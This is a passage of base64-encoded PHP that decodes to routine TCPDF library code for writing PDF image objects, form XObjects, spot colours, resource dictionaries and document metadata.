J1ZTsKCQkJCSRvdXQgLj0gJyAvQ29sb3JTcGFjZSBbL0lDQ0Jhc2VkICcuKCR0aGlzLT5uICsgMSkuJyAwIFJdJzsKCQkJfSBlbHNlaWYgKCRpbmZvWydjcyddID09ICdJbmRleGVkJykgewoJCQkJLy8gSW5kZXhlZCBDb2xvdXIgU3BhY2UKCQkJCSRvdXQgLj0gJyAvQ29sb3JTcGFjZSBbL0luZGV4ZWQgL0RldmljZVJHQiAnLigoc3RybGVuKCRpbmZvWydwYWwnXSkgLyAzKSAtIDEpLicgJy4oJHRoaXMtPm4gKyAxKS4nIDAgUl0nOwoJCQl9IGVsc2UgewoJCQkJLy8gRGV2aWNlIENvbG91ciBTcGFjZQoJCQkJJG91dCAuPSAnIC9Db2xvclNwYWNlIC8nLiRpbmZvWydjcyddOwoJCQl9CgkJCWlmICgkaW5mb1snY3MnXSA9PSAnRGV2aWNlQ01ZSycpIHsKCQkJCSRvdXQgLj0gJyAvRGVjb2RlIFsxIDAgMSAwIDEgMCAxIDBdJzsKCQkJfQoJCQkkb3V0IC49ICcgL0JpdHNQZXJDb21wb25lbnQgJy4kaW5mb1snYnBjJ107CgkJCWlmICgkYWx0b2lkID4gMCkgewoJCQkJLy8gcmVmZXJlbmNlIHRvIGFsdGVybmF0ZSBpbWFnZXMgZGljdGlvbmFyeQoJCQkJJG91dCAuPSAnIC9BbHRlcm5hdGVzICcuJGFsdG9pZC4nIDAgUic7CgkJCX0KCQkJaWYgKGlzc2V0KCRpbmZvWydleHVybCddKSBBTkQgIWVtcHR5KCRpbmZvWydleHVybCddKSkgewoJCQkJLy8gZXh0ZXJuYWwgc3RyZWFtCgkJCQkkb3V0IC49ICcgL0xlbmd0aCAwJzsKCQkJCSRvdXQgLj0gJyAvRiA8PCAvRlMgL1VSTCAvRiAnLiR0aGlzLT5fZGF0YXN0cmluZygkaW5mb1snZXh1cmwnXSwgJG9pZCkuJyA+Pic7CgkJCQlpZiAoaXNzZXQoJGluZm9bJ2YnXSkpIHsKCQkJCQkkb3V0IC49ICcgL0ZGaWx0ZXIgLycuJGluZm9bJ2YnXTsKCQkJCX0KCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkkb3V0IC49ICcgc3RyZWFtJy4iXG4iLidlbmRzdHJlYW0nOwoJCQl9IGVsc2UgewoJCQkJaWYgKGlzc2V0KCRpbmZvWydmJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9GaWx0ZXIgLycuJGluZm9bJ2YnXTsKCQkJCX0KCQkJCWlmIChpc3NldCgkaW5mb1sncGFybXMnXSkpIHsKCQkJCQkkb3V0IC49ICcgJy4kaW5mb1sncGFybXMnXTsKCQkJCX0KCQkJCWlmIChpc3NldCgkaW5mb1sndHJucyddKSBBTkQgaXNfYXJyYXkoJGluZm9bJ3RybnMnXSkpIHsKCQkJCQkkdHJucyA9ICcnOwoJCQkJCSRjb3VudF9pbmZvID0gY291bnQoJGluZm9bJ3RybnMnXSk7CgkJCQkJaWYgKCRpbmZvWydjcyddID09ICdJbmRleGVkJykgewoJCQkJCQkkbWF4dmFsID0ocG93KDIsICRpbmZvWydicGMnXSkgLSAxKTsKCQkJCQkJZm9yICgkaSA9IDA7ICRpIDwgJGNvdW50X2luZm87ICsrJGkpIHsKCQkJCQkJCWlmICgoJGluZm9bJ3RybnMnXVskaV0gIT0gMCkgQU5EICgkaW5mb1sndHJucyddWyRpXSAhPSAkbWF4dmFsKSkgewoJCQkJCQkJCS8vIHRoaXMgaXMgbm90IGEgYmluYXJ5IHR5cGUgbWFzayBAVE9ETzogY3JlYXRlIGEgU01hc2sKCQkJCQkJCQkkdHJucyA9ICcnOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJfSBlbHNlaWYgKGVtcHR5KCR0cm5zKSBBTkQgKCRpbmZvWyd0cm5zJ11bJGldID09IDApKSB7CgkJCQkJCQkJLy8gc3RvcmUgdGhlIGZpcnN0IGZ1bGx5IHRyYW5zcGFyZW50IHZhbHVlCgkJCQkJCQkJJHRybnMgLj0gJGkuJyAnLiRpLicgJzsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIGdyYXlzY2FsZSBvciBSR0IKCQkJCQkJZm9yICgkaSA9IDA7ICRpIDwgJGNvdW50X2luZm87ICsrJGkpIHsKCQkJCQkJCWlmICgkaW5mb1sndHJucyddWyRpXSA9PSAwKSB7CgkJCQkJCQkJJHRybnMgLj0gJGluZm9bJ3RybnMnXVskaV0uJyAnLiRpbmZvWyd0cm5zJ11bJGldLicgJzsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQkvLyBDb2xvdXIgS2V5IE1hc2tpbmcKCQkJCQlpZiAoIWVtcHR5KCR0cm5zKSkgewoJCQkJCQkkb3V0IC49ICcgL01hc2sgWycuJHRybnMuJ10nOwoJCQkJCX0KCQkJCX0KCQkJCSRzdHJlYW0gPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkaW5mb1snZGF0YSddKTsKCQkJCSRvdXQgLj0gJyAvTGVuZ3RoICcuc3RybGVuKCRzdHJlYW0pLicgPj4nOwoJCQkJJG91dCAuPSAnIHN0cmVhbScuIlxuIi4kc3RyZWFtLiJcbiIuJ2VuZHN0cmVhbSc7CgkJCX0KCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJaWYgKCRpY2MpIHsKCQkJCS8vIElDQyBjb2xvdXIgcHJvZmlsZQoJCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJCSRpY2MgPSAoJHRoaXMtPmNvbXByZXNzKSA/IGd6Y29tcHJlc3MoJGluZm9bJ2ljYyddKSA6ICRpbmZvWydpY2MnXTsKCQkJCSRpY2MgPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkaWNjKTsKCQkJCSR0aGlzLT5fb3V0KCc8PC9OICcuJGluZm9bJ2NoJ10uJyAvQWx0ZXJuYXRlIC8nLiRpbmZvWydjcyddLicgJy4kZmlsdGVyLicvTGVuZ3RoICcuc3RybGVuKCRpY2MpLic+PiBzdHJlYW0nLiJcbiIuJGljYy4iXG4iLidlbmRzdHJlYW0nLiJcbiIuJ2VuZG9iaicpOwoJCQl9IGVsc2VpZiAoJGluZm9bJ2NzJ10gPT0gJ0luZGV4ZWQnKSB7CgkJCQkvLyBjb2xvdXIgcGFsZXR0ZQoJCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJCSRwYWwgPSAoJHRoaXMtPmNvbXByZXNzKSA/IGd6Y29tcHJlc3MoJGluZm9bJ3BhbCddKSA6ICRpbmZvWydwYWwnXTsKCQkJCSRwYWwgPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkcGFsKTsKCQkJCSR0aGlzLT5fb3V0KCc8PCcuJGZpbHRlci4nL0xlbmd0aCAnLnN0cmxlbigkcGFsKS4nPj4gc3RyZWFtJy4iXG4iLiRwYWwuIlxuIi4nZW5kc3RyZWFtJy4iXG4iLidlbmRvYmonKTsKCQkJfQoJCX0KCX0KCgkvKioKCSAqIE91dHB1dCBGb3JtIFhPYmplY3RzIFRlbXBsYXRlcy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS44LjAxNyAoMjAxMC0wOC0yNCkKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzZWUgc3RhcnRUZW1wbGF0ZSgpLCBlbmRUZW1wbGF0ZSgpLCBwcmludFRlbXBsYXRlKCkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9wdXR4b2JqZWN0cygpIHsKCQlmb3JlYWNoICgkdGhpcy0+eG9iamVjdHMgYXMgJGtleSA9PiAkZGF0YSkgewoJCQlpZiAoaXNzZXQoJGRhdGFbJ291dGRhdGEnXSkpIHsKCQkJCSRzdHJlYW0gPSBzdHJfcmVwbGFjZSgkdGhpcy0+ZXBzbWFya2VyLCAnJywgdHJpbSgkZGF0YVsnb3V0ZGF0YSddKSk7CgkJCQkkb3V0ID0gJHRoaXMtPl9nZXRvYmooJGRhdGFbJ24nXSkuIlxuIjsKCQkJCSRvdXQgLj0gJzw8JzsKCQkJCSRvdXQgLj0gJyAvVHlwZSAvWE9iamVjdCc7CgkJCQkkb3V0IC49ICcgL1N1YnR5cGUgL0Zvcm0nOwoJCQkJJG91dCAuPSAnIC9Gb3JtVHlwZSAxJzsKCQkJCWlmICgkdGhpcy0+Y29tcHJlc3MpIHsKCQkJCQkkc3RyZWFtID0gZ3pjb21wcmVzcygkc3RyZWFtKTsKCQkJCQkkb3V0IC49ICcgL0ZpbHRlciAvRmxhdGVEZWNvZGUnOwoJCQkJfQoJCQkJJG91dCAuPSBzcHJpbnRmKCcgL0JCb3ggWyVGICVGICVGICVGXScsICgkZGF0YVsneCddICogJHRoaXMtPmspLCAoLSRkYXRhWyd5J10gKiAkdGhpcy0+ayksICgoJGRhdGFbJ3cnXSArICRkYXRhWyd4J10pICogJHRoaXMtPmspLCAoKCRkYXRhWydoJ10gLSAkZGF0YVsneSddKSAqICR0aGlzLT5rKSk7CgkJCQkkb3V0IC49ICcgL01hdHJpeCBbMSAwIDAgMSAwIDBdJzsKCQkJCSRvdXQgLj0gJyAvUmVzb3VyY2VzIDw8JzsKCQkJCSRvdXQgLj0gJyAvUHJvY1NldCBbL1BERiAvVGV4dCAvSW1hZ2VCIC9JbWFnZUMgL0ltYWdlSV0nOwoJCQkJaWYgKCEkdGhpcy0+cGRmYV9tb2RlIHx8ICR0aGlzLT5wZGZhX3ZlcnNpb24gPj0gMikgewoJCQkJCS8vIHRyYW5zcGFyZW5jeQoJCQkJCWlmIChpc3NldCgkZGF0YVsnZXh0Z3N0YXRlcyddKSBBTkQgIWVtcHR5KCRkYXRhWydleHRnc3RhdGVzJ10pKSB7CgkJCQkJCSRvdXQgLj0gJyAvRXh0R1N0YXRlIDw8JzsKCQkJCQkJZm9yZWFjaCAoJGRhdGFbJ2V4dGdzdGF0ZXMnXSBhcyAkayA9PiAkZXh0Z3N0YXRlKSB7CgkJCQkJCQlpZiAoaXNzZXQoJHRoaXMtPmV4dGdzdGF0ZXNbJGtdWyduYW1lJ10pKSB7CgkJCQkJCQkJJG91dCAuPSAnIC8nLiR0aGlzLT5leHRnc3RhdGVzWyRrXVsnbmFtZSddOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkb3V0IC49ICcgL0dTJy4kazsKCQkJCQkJCX0KCQkJCQkJCSRvdXQgLj0gJyAnLiR0aGlzLT5leHRnc3RhdGVzWyRrXVsnbiddLicgMCBSJzsKCQkJCQkJfQoJCQkJCQkkb3V0IC49ICcgPj4nOwoJCQkJCX0KCQkJCQlpZiAoaXNzZXQoJGRhdGFbJ2dyYWRpZW50cyddKSBBTkQgIWVtcHR5KCRkYXRhWydncmFkaWVudHMnXSkpIHsKCQkJCQkJJGdwID0gJyc7CgkJCQkJCSRncyA9ICcnOwoJCQkJCQlmb3JlYWNoICgkZGF0YVsnZ3JhZGllbnRzJ10gYXMgJGlkID0+ICRncmFkKSB7CgkJCQkJCQkvLyBncmFkaWVudCBwYXR0ZXJucwoJCQkJCQkJJGdwIC49ICcgL3AnLiRpZC4nICcuJHRoaXMtPmdyYWRpZW50c1skaWRdWydwYXR0ZXJuJ10uJyAwIFInOwoJCQkJCQkJLy8gZ3JhZGllbnQgc2hhZGluZ3MKCQkJCQkJCSRncyAuPSAnIC9TaCcuJGlkLicgJy4kdGhpcy0+Z3JhZGllbnRzWyRpZF1bJ2lkJ10uJyAwIFInOwoJCQkJCQl9CgkJCQkJCSRvdXQgLj0gJyAvUGF0dGVybiA8PCcuJGdwLicgPj4nOwoJCQkJCQkkb3V0IC49ICcgL1NoYWRpbmcgPDwnLiRncy4nID4+JzsKCQkJCQl9CgkJCQl9CgkJCQkvLyBzcG90IGNvbG9ycwoJCQkJaWYgKGlzc2V0KCRkYXRhWydzcG90X2NvbG9ycyddKSBBTkQgIWVtcHR5KCRkYXRhWydzcG90X2NvbG9ycyddKSkgewoJCQkJCSRvdXQgLj0gJyAvQ29sb3JTcGFjZSA8PCc7CgkJCQkJZm9yZWFjaCAoJGRhdGFbJ3Nwb3RfY29sb3JzJ10gYXMgJG5hbWUgPT4gJGNvbG9yKSB7CgkJCQkJCSRvdXQgLj0gJyAvQ1MnLiRjb2xvclsnaSddLicgJy4kdGhpcy0+c3BvdF9jb2xvcnNbJG5hbWVdWyduJ10uJyAwIFInOwoJCQkJCX0KCQkJCQkkb3V0IC49ICcgPj4nOwoJCQkJfQoJCQkJLy8gZm9udHMKCQkJCWlmICghZW1wdHkoJGRhdGFbJ2ZvbnRzJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9Gb250IDw8JzsKCQkJCQlmb3JlYWNoICgkZGF0YVsnZm9udHMnXSBhcyAkZm9udGtleSA9PiAkZm9udGlkKSB7CgkJCQkJCSRvdXQgLj0gJyAvRicuJGZvbnRpZC4nICcuJHRoaXMtPmZvbnRfb2JqX2lkc1skZm9udGtleV0uJyAwIFInOwoJCQkJCX0KCQkJCQkkb3V0IC49ICcgPj4nOwoJCQkJfQoJCQkJLy8gaW1hZ2VzIG9yIG5lc3RlZCB4b2JqZWN0cwoJCQkJaWYgKCFlbXB0eSgkZGF0YVsnaW1hZ2VzJ10pIE9SICFlbXB0eSgkZGF0YVsneG9iamVjdHMnXSkpIHsKCQkJCQkkb3V0IC49ICcgL1hPYmplY3QgPDwnOwoJCQkJCWZvcmVhY2ggKCRkYXRhWydpbWFnZXMnXSBhcyAkaW1naWQpIHsKCQkJCQkJJG91dCAuPSAnIC9JJy4kaW1naWQuJyAnLiR0aGlzLT54b2JqZWN0c1snSScuJGltZ2lkXVsnbiddLicgMCBSJzsKCQkJCQl9CgkJCQkJZm9yZWFjaCAoJGRhdGFbJ3hvYmplY3RzJ10gYXMgJHN1Yl9pZCA9PiAkc3ViX29iamlkKSB7CgkJCQkJCSRvdXQgLj0gJyAvJy4kc3ViX2lkLicgJy4kc3ViX29iamlkWyduJ10uJyAwIFInOwoJCQkJCX0KCQkJCQkkb3V0IC49ICcgPj4nOwoJCQkJfQoJCQkJJG91dCAuPSAnID4+JzsgLy9lbmQgcmVzb3VyY2VzCgkJCQlpZiAoaXNzZXQoJGRhdGFbJ2dyb3VwJ10pIEFORCAoJGRhdGFbJ2dyb3VwJ10gIT09IGZhbHNlKSkgewoJCQkJCS8vIHNldCB0cmFuc3BhcmVuY3kgZ3JvdXAKCQkJCQkkb3V0IC49ICcgL0dyb3VwIDw8IC9UeXBlIC9Hcm91cCAvUyAvVHJhbnNwYXJlbmN5JzsKCQkJCQlpZiAoaXNfYXJyYXkoJGRhdGFbJ2dyb3VwJ10pKSB7CgkJCQkJCWlmIChpc3NldCgkZGF0YVsnZ3JvdXAnXVsnQ1MnXSkgQU5EICFlbXB0eSgkZGF0YVsnZ3JvdXAnXVsnQ1MnXSkpIHsKCQkJCQkJCSRvdXQgLj0gJyAvQ1MgLycuJGRhdGFbJ2dyb3VwJ11bJ0NTJ107CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCRkYXRhWydncm91cCddWydJJ10pKSB7CgkJCQkJCQkkb3V0IC49ICcgL0kgLycuKCRkYXRhWydncm91cCddWydJJ109PT10cnVlPyd0cnVlJzonZmFsc2UnKTsKCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGRhdGFbJ2dyb3VwJ11bJ0snXSkpIHsKCQkJCQkJCSRvdXQgLj0gJyAvSyAvJy4oJGRhdGFbJ2dyb3VwJ11bJ0snXT09PXRydWU/J3RydWUnOidmYWxzZScpOwoJCQkJCQl9CgkJCQkJfQoJCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQl9CgkJCQkkc3RyZWFtID0gJHRoaXMtPl9nZXRyYXdzdHJlYW0oJHN0cmVhbSwgJGRhdGFbJ24nXSk7CgkJCQkkb3V0IC49ICcgL0xlbmd0aCAnLnN0cmxlbigkc3RyZWFtKTsKCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkkb3V0IC49ICcgc3RyZWFtJy4iXG4iLiRzdHJlYW0uIlxuIi4nZW5kc3RyZWFtJzsKCQkJCSRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQl9CgkJfQoJfQoKCS8qKgoJICogT3V0cHV0IFNwb3QgQ29sb3JzIFJlc291cmNlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjAuMDI0ICgyMDA4LTA5LTEyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dHNwb3Rjb2xvcnMoKSB7CgkJZm9yZWFjaCAoJHRoaXMtPnNwb3RfY29sb3JzIGFzICRuYW1lID0+ICRjb2xvcikgewoJCQkkdGhpcy0+X25ld29iaigpOwoJCQkkdGhpcy0+c3BvdF9jb2xvcnNbJG5hbWVdWyduJ10gPSAkdGhpcy0+bjsKCQkJJG91dCA9ICdbL1NlcGFyYXRpb24gLycuc3RyX3JlcGxhY2UoJyAnLCAnIzIwJywgJG5hbWUpOwoJCQkkb3V0IC49ICcgL0RldmljZUNNWUsgPDwnOwoJCQkkb3V0IC49ICcgL1JhbmdlIFswIDEgMCAxIDAgMSAwIDFdIC9DMCBbMCAwIDAgMF0nOwoJCQkkb3V0IC49ICcgJy5zcHJpbnRmKCcvQzEgWyVGICVGICVGICVGXSAnLCAoJGNvbG9yWydDJ10gLyAxMDApLCAoJGNvbG9yWydNJ10gLyAxMDApLCAoJGNvbG9yWydZJ10gLyAxMDApLCAoJGNvbG9yWydLJ10gLyAxMDApKTsKCQkJJG91dCAuPSAnIC9GdW5jdGlvblR5cGUgMiAvRG9tYWluIFswIDFdIC9OIDE+Pl0nOwoJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCX0KCX0KCgkvKioKCSAqIFJldHVybiBYT2JqZWN0cyBEaWN0aW9uYXJ5LgoJICogQHJldHVybiBzdHJpbmcgWE9iamVjdHMgZGljdGlvbmFyeQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOC4wMTQgKDIwMTAtMDgtMjMpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfZ2V0eG9iamVjdGRpY3QoKSB7CgkJJG91dCA9ICcnOwoJCWZvcmVhY2ggKCR0aGlzLT54b2JqZWN0cyBhcyAkaWQgPT4gJG9iamlkKSB7CgkJCSRvdXQgLj0gJyAvJy4kaWQuJyAnLiRvYmppZFsnbiddLicgMCBSJzsKCQl9CgkJcmV0dXJuICRvdXQ7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgUmVzb3VyY2VzIERpY3Rpb25hcnkuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0cmVzb3VyY2VkaWN0KCkgewoJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigyKS4iXG4iOwoJCSRvdXQgLj0gJzw8IC9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXSc7CgkJJG91dCAuPSAnIC9Gb250IDw8JzsKCQlmb3JlYWNoICgkdGhpcy0+Zm9udGtleXMgYXMgJGZvbnRrZXkpIHsKCQkJJGZvbnQgPSAkdGhpcy0+Z2V0Rm9udEJ1ZmZlcigkZm9udGtleSk7CgkJCSRvdXQgLj0gJyAvRicuJGZvbnRbJ2knXS4nICcuJGZvbnRbJ24nXS4nIDAgUic7CgkJfQoJCSRvdXQgLj0gJyA+Pic7CgkJJG91dCAuPSAnIC9YT2JqZWN0IDw8JzsKCQkkb3V0IC49ICR0aGlzLT5fZ2V0eG9iamVjdGRpY3QoKTsKCQkkb3V0IC49ICcgPj4nOwoJCS8vIGxheWVycwoJCWlmICghZW1wdHkoJHRoaXMtPnBkZmxheWVycykpIHsKCQkJJG91dCAuPSAnIC9Qcm9wZXJ0aWVzIDw8JzsKCQkJZm9yZWFjaCAoJHRoaXMtPnBkZmxheWVycyBhcyAkbGF5ZXIpIHsKCQkJCSRvdXQgLj0gJyAvJy4kbGF5ZXJbJ2xheWVyJ10uJyAnLiRsYXllclsnb2JqaWQnXS4nIDAgUic7CgkJCX0KCQkJJG91dCAuPSAnID4+JzsKCQl9CgkJaWYgKCEkdGhpcy0+cGRmYV9tb2RlIHx8ICR0aGlzLT5wZGZhX3ZlcnNpb24gPj0gMikgewoJCQkvLyB0cmFuc3BhcmVuY3kKCQkJaWYgKGlzc2V0KCR0aGlzLT5leHRnc3RhdGVzKSBBTkQgIWVtcHR5KCR0aGlzLT5leHRnc3RhdGVzKSkgewoJCQkJJG91dCAuPSAnIC9FeHRHU3RhdGUgPDwnOwoJCQkJZm9yZWFjaCAoJHRoaXMtPmV4dGdzdGF0ZXMgYXMgJGsgPT4gJGV4dGdzdGF0ZSkgewoJCQkJCWlmIChpc3NldCgkZXh0Z3N0YXRlWyduYW1lJ10pKSB7CgkJCQkJCSRvdXQgLj0gJyAvJy4kZXh0Z3N0YXRlWyduYW1lJ107CgkJCQkJfSBlbHNlIHsKCQkJCQkJJG91dCAuPSAnIC9HUycuJGs7CgkJCQkJfQoJCQkJCSRvdXQgLj0gJyAnLiRleHRnc3RhdGVbJ24nXS4nIDAgUic7CgkJCQl9CgkJCQkkb3V0IC49ICcgPj4nOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+Z3JhZGllbnRzKSBBTkQgIWVtcHR5KCR0aGlzLT5ncmFkaWVudHMpKSB7CgkJCQkkZ3AgPSAnJzsKCQkJCSRncyA9ICcnOwoJCQkJZm9yZWFjaCAoJHRoaXMtPmdyYWRpZW50cyBhcyAkaWQgPT4gJGdyYWQpIHsKCQkJCQkvLyBncmFkaWVudCBwYXR0ZXJucwoJCQkJCSRncCAuPSAnIC9wJy4kaWQuJyAnLiRncmFkWydwYXR0ZXJuJ10uJyAwIFInOwoJCQkJCS8vIGdyYWRpZW50IHNoYWRpbmdzCgkJCQkJJGdzIC49ICcgL1NoJy4kaWQuJyAnLiRncmFkWydpZCddLicgMCBSJzsKCQkJCX0KCQkJCSRvdXQgLj0gJyAvUGF0dGVybiA8PCcuJGdwLicgPj4nOwoJCQkJJG91dCAuPSAnIC9TaGFkaW5nIDw8Jy4kZ3MuJyA+Pic7CgkJCX0KCQl9CgkJLy8gc3BvdCBjb2xvcnMKCQlpZiAoaXNzZXQoJHRoaXMtPnNwb3RfY29sb3JzKSBBTkQgIWVtcHR5KCR0aGlzLT5zcG90X2NvbG9ycykpIHsKCQkJJG91dCAuPSAnIC9Db2xvclNwYWNlIDw8JzsKCQkJZm9yZWFjaCAoJHRoaXMtPnNwb3RfY29sb3JzIGFzICRjb2xvcikgewoJCQkJJG91dCAuPSAnIC9DUycuJGNvbG9yWydpJ10uJyAnLiRjb2xvclsnbiddLicgMCBSJzsKCQkJfQoJCQkkb3V0IC49ICcgPj4nOwoJCX0KCQkkb3V0IC49ICcgPj4nOwoJCSRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkkdGhpcy0+X291dCgkb3V0KTsKCX0KCgkvKioKCSAqIE91dHB1dCBSZXNvdXJjZXMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0cmVzb3VyY2VzKCkgewoJCSR0aGlzLT5fcHV0ZXh0Z3N0YXRlcygpOwoJCSR0aGlzLT5fcHV0b2NnKCk7CgkJJHRoaXMtPl9wdXRmb250cygpOwoJCSR0aGlzLT5fcHV0aW1hZ2VzKCk7CgkJJHRoaXMtPl9wdXRzcG90Y29sb3JzKCk7CgkJJHRoaXMtPl9wdXRzaGFkZXJzKCk7CgkJJHRoaXMtPl9wdXR4b2JqZWN0cygpOwoJCSR0aGlzLT5fcHV0cmVzb3VyY2VkaWN0KCk7CgkJJHRoaXMtPl9wdXRkZXN0cygpOwoJCSR0aGlzLT5fcHV0RW1iZWRkZWRGaWxlcygpOwoJCSR0aGlzLT5fcHV0YW5ub3Rzb2JqcygpOwoJCSR0aGlzLT5fcHV0amF2YXNjcmlwdCgpOwoJCSR0aGlzLT5fcHV0Ym9va21hcmtzKCk7CgkJJHRoaXMtPl9wdXRlbmNyeXB0aW9uKCk7Cgl9CgoJLyoqCgkgKiBBZGRzIHNvbWUgTWV0YWRhdGEgaW5mb3JtYXRpb24gKERvY3VtZW50IEluZm9ybWF0aW9uIERpY3Rpb25hcnkpCgkgKiAoc2VlIENoYXB0ZXIgMTQuMy4zIERvY3VtZW50IEluZm9ybWF0aW9uIERpY3Rpb25hcnkgb2YgUERGMzIwMDBfMjAwOC5wZGYgUmVmZXJlbmNlKQoJICogQHJldHVybiBpbnQgb2JqZWN0IGlkCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0aW5mbygpIHsKCQkkb2lkID0gJHRoaXMtPl9uZXdvYmooKTsKCQkkb3V0ID0gJzw8JzsKCQkvLyBzdG9yZSBjdXJyZW50IGlzdW5pY29kZSB2YWx1ZQoJCSRwcmV2X2lzdW5pY29kZSA9ICR0aGlzLT5pc3VuaWNvZGU7CgkJaWYgKCR0aGlzLT5kb2NpbmZvdW5pY29kZSkgewoJCQkkdGhpcy0+aXN1bmljb2RlID0gdHJ1ZTsKCQl9CgkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+dGl0bGUpKSB7CgkJCS8vIFRoZSBkb2N1bWVudCdzIHRpdGxlLgoJCQkkb3V0IC49ICcgL1RpdGxlICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR0aGlzLT50aXRsZSwgJG9pZCk7CgkJfQoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPmF1dGhvcikpIHsKCQkJLy8gVGhlIG5hbWUgb2YgdGhlIHBlcnNvbiB3aG8gY3JlYXRlZCB0aGUgZG9jdW1lbnQuCgkJCSRvdXQgLj0gJyAvQXV0aG9yICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR0aGlzLT5hdXRob3IsICRvaWQpOwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT5zdWJqZWN0KSkgewoJCQkvLyBUaGUgc3ViamVjdCBvZiB0aGUgZG9jdW1lbnQuCgkJCSRvdXQgLj0gJyAvU3ViamVjdCAnLiR0aGlzLT5fdGV4dHN0cmluZygkdGhpcy0+c3ViamVjdCwgJG9pZCk7CgkJfQoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPmtleXdvcmRzKSkgewoJCQkvLyBLZXl3b3JkcyBhc3NvY2lhdGVkIHdpdGggdGhlIGRvY3VtZW50LgoJCQkkb3V0IC49ICcgL0tleXdvcmRzICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR0aGlzLT5rZXl3b3JkcywgJG9pZCk7CgkJfQoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPmNyZWF0b3IpKSB7CgkJCS8vIElmIHRoZSBkb2N1bWVudCB3YXMgY29udmVydGVkIHRvIFBERiBmcm9tIGFub3RoZXIgZm9ybWF0LCB0aGUgbmFtZSBvZiB0aGUgY29uZm9ybWluZyBwcm9kdWN0IHRoYXQgY3JlYXRlZCB0aGUgb3JpZ2luYWwgZG9jdW1lbnQgZnJvbSB3aGljaCBpdCB3YXMgY29udmVydGVkLgoJCQkkb3V0IC49ICcgL0NyZWF0b3IgJy4kdGhpcy0+X3RleHRzdHJpbmcoJHRoaXMtPmNyZWF0b3IsICRvaWQpOwoJCX0KCQkvLyByZXN0b3JlIHByZXZpb3VzIGlzdW5pY29kZSB2YWx1ZQoJCSR0aGlzLT5pc3VuaWNvZGUgPSAkcHJldl9pc3VuaWNvZGU7CgkJLy8gZGVmYXVsdCBwcm9kdWNlcgoJCSRvdXQgLj0gJyAvUHJvZHVjZXIgJy4kdGhpcy0+X3RleHRzdHJpbmcoVENQREZfU1RBVElDOjpnZXRUQ1BERlByb2R1Y2VyKCksICRvaWQpOwoJCS8vIFRoZSBkYXRlIGFuZCB0aW1lIHRoZSBkb2N1bWVudCB3YXMgY3JlYXRlZCwgaW4gaHVtYW4tcmVhZGFibGUgZm9ybQoJCSRvdXQgLj0gJyAvQ3JlYXRpb25EYXRlICcuJHRoaXMtPl9kYXRlc3RyaW5nKDAsICR0aGlzLT5kb2NfY3JlYXRpb25fdGltZXN0YW1wKTsKCQkvLyBUaGUgZGF0ZSBhbmQgdGltZSB0aGUgZG9jdW1lbnQgd2FzIG1vc3QgcmVjZW50bHkgbW9kaWZpZWQsIGluIGh1bWFuLXJlYWRhYmxlIGZvcm0KCQkkb3V0IC49ICcgL01vZERhdGUgJy4kdGhpcy0+X2RhdGVzdHJpbmcoMCwgJHRoaXMtPmRvY19tb2RpZmljYXRpb25fdGltZXN0YW1wKTsKCQkvLyBBIG5hbWUgb2JqZWN0IGluZGljYXRpbmcgd2hldGhlciB0aGUgZG9jdW1lbnQgaGFzIGJlZW4gbW9kaWZpZWQgdG8gaW5jbHVkZSB0cmFwcGluZyBpbmZvcm1hdGlvbgoJCSRvdXQgLj0gJyAvVHJhcHBlZCAvRmFsc2UnOwoJCSRvdXQgLj0gJyA+Pic7CgkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCXJldHVybiAkb2lkOwoJfQoKCS8qKgoJICogU2V0IGFkZGl0aW9uYWwgWE1QIGRhdGEgdG8gYm